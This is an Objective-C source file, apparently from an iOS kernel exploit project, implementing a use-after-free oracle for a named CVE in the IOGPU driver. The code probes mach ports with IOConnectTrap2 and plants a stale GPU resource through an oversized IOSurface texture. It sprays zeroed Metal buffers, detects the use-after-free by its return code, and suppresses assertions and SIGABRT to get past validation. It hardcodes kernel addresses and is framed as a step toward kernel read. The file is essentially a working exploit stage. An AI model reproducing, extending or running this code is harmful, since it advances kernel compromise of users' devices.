//
//  P065FacetAOracle.m
//  CVE-2026-64788 Facet A oracle (Lum1na IOGPUStaleEntryProbe v3.1 contract).
//  Census 64x64 → plant 1x65535 → Trap2 sel=3 → spray zeros.
//  0xe00002be = UAF confirm. Call2/Call3 skipped. Not hasKread.
//  Pin: cve64788_IOGPU_set_resource_purgeable @ 0xfffffff0095c84f0
//

#import "P065FacetAOracle.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <IOKit/IOKitLib.h>
#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <setjmp.h>
#import <signal.h>
#import <stdarg.h>
#import <string.h>
#import <unistd.h>

#define P065_BUILD @"p065-facet-a-oracle-v1"
#define P065_SEL_PURGE 3
#define P065_UAF_KR ((kern_return_t)0xe00002be)
#define P065_SPRAY_N 0x300
#define P065_SPRAY_SZ 0x100

typedef struct __IOSurface *IOSurfaceRef;
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef kern_return_t (*IOConnectTrap2_t)(io_connect_t, uint32_t, uintptr_t, uintptr_t);

static int g_fd = -1;
static NSMutableString *g_log;
static volatile int g_armed;
static sigjmp_buf g_jmp;
static IOConnectTrap2_t g_trap2;
static IOSurfaceCreate_t g_iosCreate;

static void p065_log(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [g_log appendString:out];
    if (g_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) { write(g_fd, s, strlen(s)); fcntl(g_fd, F_FULLFSYNC); }
    }
}

static void p065_sigabort(int sig, siginfo_t *info, void *vctx) {
    (void)sig; (void)info; (void)vctx;
    if (g_armed) siglongjmp(g_jmp, 1);
}

@interface P065AssertSwallow : NSAssertionHandler @end
@implementation P065AssertSwallow
- (void)handleFailureInMethod:(SEL)s object:(id)o file:(NSString *)f
                   lineNumber:(NSInteger)l description:(NSString *)d, ... {
    p065_log(@"[bypass] assertion swallowed");
}
- (void)handleFailureInFunction:(NSString *)fn file:(NSString *)f
                     lineNumber:(NSInteger)l description:(NSString *)d, ... {
    p065_log(@"[bypass] assertion swallowed");
}
@end

static NSArray<NSNumber *> *p065_conns(void) {
    NSMutableArray *conns = [NSMutableArray array];
    mach_port_name_array_t names = NULL;
    mach_msg_type_number_t nn = 0;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t nt = 0;
    if (mach_port_names(mach_task_self(), &names, &nn, &types, &nt) != KERN_SUCCESS)
        return conns;
    for (mach_msg_type_number_t i = 0; i < nn; i++) {
        if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
        mach_port_name_t p = names[i];
        if (p < 0x100 || p > 0xFFFF) continue;
        kern_return_t kr = g_trap2((io_connect_t)p, P065_SEL_PURGE, 1, 0);
        if (kr != (kern_return_t)0xe00002c2 && kr != (kern_return_t)0xe00002c7) {
            p065_log(@"[conn] port=0x%x sel3 kr=0x%x", (unsigned)p, (unsigned)kr);
            [conns addObject:@(p)];
        }
    }
    if (names && nn) vm_deallocate(mach_task_self(), (vm_address_t)names, nn * sizeof(mach_port_name_t));
    if (types && nt) vm_deallocate(mach_task_self(), (vm_address_t)types, nt * sizeof(mach_port_type_t));
    p065_log(@"[conn] %u candidates", (unsigned)conns.count);
    return conns;
}

static NSMutableSet<NSNumber *> *p065_liveIds(io_connect_t conn) {
    NSMutableSet *set = [NSMutableSet set];
    for (uint32_t i = 1; i <= 255; i++) {
        kern_return_t kr = g_trap2(conn, P065_SEL_PURGE, i, 0);
        if (kr != (kern_return_t)0xe00002c2) [set addObject:@(i)];
    }
    return set;
}

static id<MTLTexture> p065_tex(id<MTLDevice> dev, uint32_t w, uint32_t h) {
    if (!g_iosCreate) return nil;
    NSDictionary *props = @{
        @"IOSurfaceWidth": @(w),
        @"IOSurfaceHeight": @(h),
        @"IOSurfaceBytesPerElement": @4,
        @"IOSurfacePixelFormat": @(0x42475241),
    };
    IOSurfaceRef surf = g_iosCreate((__bridge CFDictionaryRef)props);
    if (!surf) return nil;
    MTLTextureDescriptor *desc = [MTLTextureDescriptor new];
    desc.textureType = MTLTextureType2D;
    desc.pixelFormat = MTLPixelFormatBGRA8Unorm;
    desc.width = w;
    desc.height = h;
    desc.mipmapLevelCount = 1;
    desc.usage = MTLTextureUsageShaderRead;
    id<MTLTexture> tex = [dev newTextureWithDescriptor:desc iosurface:surf plane:0];
    CFRelease(surf);
    return tex;
}

@implementation P065FacetAOracle

+ (NSString *)tap {
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p065_facet_a_log.txt"];
    g_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_TRUNC, 0644);

    p065_log(@"=== p065 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P065_BUILD);
    p065_log(@"CVE-2026-64788 Facet A oracle. Trap2 sel=3 set_resource_purgeable 0xfffffff0095c84f0");
    p065_log(@"create path: IOGPUDevice::new_resource 0xfffffff0095c8810 type=0x82 IOSurface");
    p065_log(@"0xe00002be = UAF confirm (also new_resource alloc-fail). Spray zeros skip Call2/Call3.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p065"];
    if (stop) {
        p065_log(@"%@", stop);
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        NSString *ret = g_log; g_log = nil; return ret;
    }

    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    g_iosCreate = ios ? (IOSurfaceCreate_t)dlsym(ios, "IOSurfaceCreate") : NULL;
    g_trap2 = (IOConnectTrap2_t)dlsym(RTLD_DEFAULT, "IOConnectTrap2");
    if (!g_trap2) {
        void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY | RTLD_NOLOAD);
        if (h) g_trap2 = (IOConnectTrap2_t)dlsym(h, "IOConnectTrap2");
    }
    p065_log(@"IOConnectTrap2=%p IOSurfaceCreate=%p sku=%@", g_trap2, g_iosCreate, [LabDeviceProfile skuName]);
    if (!g_trap2) {
        p065_log(@"[-] Trap2 unresolved");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        NSString *ret = g_log; g_log = nil; return ret;
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p065_log(@"[-] no Metal device");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        NSString *ret = g_log; g_log = nil; return ret;
    }
    p065_log(@"Metal %@", dev.name);

    NSArray<NSNumber *> *conns = p065_conns();
    if (conns.count == 0) {
        p065_log(@"[-] no GPU conn candidates");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        NSString *ret = g_log; g_log = nil; return ret;
    }

    NSMutableDictionary *pre = [NSMutableDictionary dictionary];
    for (NSNumber *v in conns) pre[v] = p065_liveIds((io_connect_t)v.unsignedIntValue);

    id<MTLTexture> legit = p065_tex(dev, 64, 64);
    p065_log(@"census 64x64 tex=%@", legit ? @"OK" : @"NIL");
    if (!legit) {
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        NSString *ret = g_log; g_log = nil; return ret;
    }

    io_connect_t conn = MACH_PORT_NULL;
    uint32_t censusId = 0;
    for (NSNumber *v in conns) {
        NSSet *before = pre[v];
        NSMutableSet *after = p065_liveIds((io_connect_t)v.unsignedIntValue);
        [after minusSet:before];
        if (after.count > 0) {
            conn = (io_connect_t)v.unsignedIntValue;
            censusId = ((NSNumber *)after.anyObject).unsignedIntValue;
            p065_log(@"[+] CENSUS conn=0x%x id=%u", (unsigned)conn, (unsigned)censusId);
            break;
        }
    }
    if (!conn) {
        p065_log(@"[-] census failed — no conn grew");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        NSString *ret = g_log; g_log = nil; return ret;
    }

    struct sigaction sa, old;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = p065_sigabort;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGABRT, &sa, &old);
    NSAssertionHandler *prev = [NSThread currentThread].threadDictionary[@"NSAssertionHandlerKey"];
    [NSThread currentThread].threadDictionary[@"NSAssertionHandlerKey"] = [P065AssertSwallow new];

    uint32_t hits = 0;
    for (int it = 0; it < 2; it++) {
        p065_log(@"=== plant %d/2 ===", it + 1);
        NSSet *prePlant = p065_liveIds(conn);
        g_armed = 1;
        if (sigsetjmp(g_jmp, 1) == 0) {
            id<MTLTexture> ov = p065_tex(dev, 1, 65535);
            p065_log(@"1x65535 tex=%@", ov ? @"non-nil" : @"nil (XPC may still have fired)");
        } else {
            p065_log(@"1x65535 aborted (validation). XPC may still have fired.");
        }
        g_armed = 0;
        NSMutableSet *post = p065_liveIds(conn);
        [post minusSet:prePlant];
        if (post.count == 0) {
            p065_log(@"no new live id this plant");
            continue;
        }
        uint32_t stale = ((NSNumber *)post.anyObject).unsignedIntValue;
        p065_log(@"[+] new id=%u after 1x65535", (unsigned)stale);

        NSMutableArray *spray = [NSMutableArray array];
        for (uint32_t i = 0; i < P065_SPRAY_N; i++) {
            id<MTLBuffer> b = [dev newBufferWithLength:P065_SPRAY_SZ options:MTLResourceStorageModeShared];
            if (!b) break;
            memset(b.contents, 0, P065_SPRAY_SZ);
            [spray addObject:b];
        }
        p065_log(@"spray %u x 0x100 zeros (Call2/Call3 skipped)", (unsigned)spray.count);

        kern_return_t kr = g_trap2(conn, P065_SEL_PURGE, stale, 0);
        kern_return_t krC = g_trap2(conn, P065_SEL_PURGE, censusId, 0);
        p065_log(@"sel3 stale id=%u kr=0x%x control id=%u kr=0x%x",
                 (unsigned)stale, (unsigned)kr, (unsigned)censusId, (unsigned)krC);
        if (kr == P065_UAF_KR) {
            hits++;
            p065_log(@"[+] 0xe00002be UAF oracle HIT. Occupancy of SysMemory, not kreadbuf.");
        }
        (void)spray;
    }

    sigaction(SIGABRT, &old, NULL);
    if (prev) [NSThread currentThread].threadDictionary[@"NSAssertionHandlerKey"] = prev;
    else [[NSThread currentThread].threadDictionary removeObjectForKey:@"NSAssertionHandlerKey"];

    p065_log(@"=== VERDICT hits=%u ===", hits);
    p065_log(@"Facet A is an oracle. Shape-1 kernel MD reclaim still required for kread.");
    p065_log(@"hasKread stays NO.");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    NSString *ret = g_log;
    g_log = nil;
    return ret;
}

@end
